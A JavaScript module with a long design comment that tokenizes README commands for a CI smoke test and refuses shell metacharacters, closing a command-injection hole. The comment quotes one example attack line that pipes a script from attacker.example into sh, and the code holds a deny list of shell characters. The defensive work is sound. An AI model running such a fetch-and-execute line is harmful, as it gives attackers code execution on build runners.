/**
 * scripts/readme-command-tokenize.mjs — turn a documented command line into an argv, or refuse it.
 *
 * ROLE
 * ----
 * This is the security boundary of `scripts/readme-commands-smoke.mjs`, which EXECUTES the commands
 * the README documents so that a documented command which does not work is caught. A raw README
 * line must never be handed to a shell —
 *
 *     spawnSync(command, { cwd: ROOT, shell: true, … })
 *
 * — while validating only its PREFIX (`/^pnpm\s+(?:run\s+)?([A-Za-z][\w:-]*)/`). Everything after
 * the script name was never examined. `pnpm run docs:check` runs that gate and
 * `.github/workflows/verify.yml` runs `docs:check` on `push` AND on `pull_request`, forks included.
 * So a pull request whose only change is a README bash fence reading
 *
 *     pnpm run typecheck && curl -s https://attacker.example/x.sh | sh
 *
 * passed the prefix check and then executed on the runner. CWE-78, reachable from an untrusted
 * contribution, on a repository whose whole current purpose is to become public.
 *
 * WHY VALIDATE RATHER THAN DROP THE EXECUTION
 * -------------------------------------------
 * Two cheaper fixes were considered and rejected:
 *
 *   - "Stop running the commands; only resolve them." Resolution alone is what caught release-review
 *     the command-and-creation contract (the README documenting an unshipped binary name), so it is not nothing — but it cannot
 *     catch a command that resolves and then fails, which is the larger half of "the documented
 *     command does not work". `… run cli -- validate fixtures/packages/keyframed-lower-third`
 *     resolves fine the day the fixture is renamed.
 *   - "Skip the gate on pull_request events." That removes the check exactly where untrusted README
 *     edits arrive, and leaves the same shell call live on every push. It moves the hole, it does not
 *     close it.
 *
 * So the command is still run, and the injection is closed at the input boundary instead: a fence
 * line either parses into an argv of inert tokens, or the gate FAILS naming the character that
 * refused it. There is no "sanitised" middle path and no escaping — the only strings this module
 * accepts are ones where quoting and escaping have nothing to do.
 *
 * THE POLICY, AND WHY IT IS THIS STRICT
 * -------------------------------------
 * A README command is documentation: something a reader pastes into a terminal. Shell composition
 * (`&&`, pipes, redirection, substitution) belongs in a script, not in a "here is how you run this"
 * fence, so refusing it costs the docs nothing and removes the entire class. Concretely:
 *
 *   bare token      only [A-Za-z0-9 _ . , : @ = + / -]. No `$` (expansion), no backtick or `(`
 *                   (substitution), no `; & |` (chaining), no `< >` (redirection), no `* ? [ ] { }`
 *                   (globbing), no `~` (home expansion), no `\` (escaping), no `#` (comment), and
 *                   no `% ^ !` (cmd.exe expansion, delayed expansion and escape — this gate runs on
 *                   the Windows rig too).
 *   "double quoted" allowed, for prose arguments like `actions find "add a snow environment"`. The
 *                   span may not contain `$`, a backtick, `\`, `%` or `!` — the characters a shell
 *                   still acts on INSIDE double quotes. Everything else, spaces included, is literal.
 *   'single quoted' REFUSED. POSIX shells treat it as a literal span; cmd.exe does not, so the same
 *                   README line would tokenise differently per platform. A gate whose meaning
 *                   depends on the host is not a gate.
 *
 * DEPENDENCIES: none — pure functions, no I/O, no side effects, deliberately importable by
 * `scripts/readme-command-tokenize.test.ts` (a module with top-level execution cannot be tested).
 * CALLERS: `scripts/readme-commands-smoke.mjs`.
 */

/** Characters a bare (unquoted) token may contain. Everything else is refused by name. */
const BARE_TOKEN = /^[A-Za-z0-9_.,:@=+/-]+$/;

/**
 * Why each refused character is refused, keyed by the character. Used to produce a failure message
 * that tells the author what to change instead of just saying "invalid".
 *
 * @type {Map<string, string>}
 */
export const REFUSED_CHARACTERS = new Map([
  ["$", "shell expansion / command substitution"],
  ["`", "command substitution"],
  ["\\", "shell escaping"],
  [";", "command chaining"],
  ["&", "command chaining / background"],
  ["|", "pipeline"],
  ["<", "input redirection"],
  [">", "output redirection"],
  ["(", "subshell / substitution"],
  [")", "subshell / substitution"],
  ["{", "brace expansion"],
  ["}", "brace expansion"],
  ["[", "glob"],
  ["]", "glob"],
  ["*", "glob"],
  ["?", "glob"],
  ["~", "home-directory expansion"],
  ["#", "comment"],
  ["!", "history / cmd.exe delayed expansion"],
  ["%", "cmd.exe variable expansion"],
  ["^", "cmd.exe escape"],
  ["'", "single quotes mean different things in sh and cmd.exe; use double quotes"],
  ["\n", "line break"],
  ["\r", "line break"]
]);

/**
 * Split one documented command line into an argv, refusing anything a shell would act on.
 *
 * The result is deliberately a value, not an exception: `readme-commands-smoke.mjs` reports every
 * problem in one pass rather than dying on the first, and a refusal is a normal gate finding.
 *
 * @param {string} command A command line as it appears in a README bash fence.
 * @returns {{ ok: true, argv: string[] }
 *          | { ok: false, reason: string, character: string, index: number }}
 *          `argv[0]` is the program; quoted spans arrive as ONE argument with their quotes removed.
 */
export function tokenizeCommand(command) {
  const argv = [];
  let token = "";
  let tokenOpen = false;
  let index = 0;

  const refuse = (character, at) => ({
    ok: /** @type {false} */ (false),
    reason: REFUSED_CHARACTERS.get(character) ?? "not allowed in a documented command",
    character,
    index: at
  });

  while (index < command.length) {
    const character = command[index];

    if (character === '"') {
      // A quoted span is one argument even when it is empty, so `""` must not vanish.
      tokenOpen = true;
      index += 1;
      let closed = false;
      while (index < command.length) {
        const inner = command[index];
        if (inner === '"') { closed = true; index += 1; break; }
        // The characters a POSIX shell still expands inside double quotes, plus the two cmd.exe does.
        if (inner === "$" || inner === "`" || inner === "\\" || inner === "%" || inner === "!" || inner === "\n" || inner === "\r") {
          return refuse(inner, index);
        }
        token += inner;
        index += 1;
      }
      if (!closed) {
        return { ok: false, reason: "unterminated double quote", character: '"', index: command.length };
      }
      continue;
    }

    if (character === " " || character === "\t") {
      if (tokenOpen || token !== "") { argv.push(token); token = ""; tokenOpen = false; }
      index += 1;
      continue;
    }

    if (!BARE_TOKEN.test(character)) return refuse(character, index);
    token += character;
    index += 1;
  }

  if (tokenOpen || token !== "") argv.push(token);
  if (argv.length === 0) return { ok: false, reason: "empty command", character: "", index: 0 };
  return { ok: true, argv };
}

/**
 * A one-line explanation of a refusal, for the gate's failure list.
 *
 * @param {string} command
 * @param {{ reason: string, character: string, index: number }} refusal
 * @returns {string}
 */
export function describeRefusal(command, refusal) {
  const shown = refusal.character === "\n" ? "\\n" : refusal.character === "\r" ? "\\r" : refusal.character;
  return `refused at column ${refusal.index + 1}: \`${shown}\` — ${refusal.reason}. ` +
    "A documented command must be a single program with literal arguments: " +
    "shell composition belongs in a script, not in a README fence.";
}
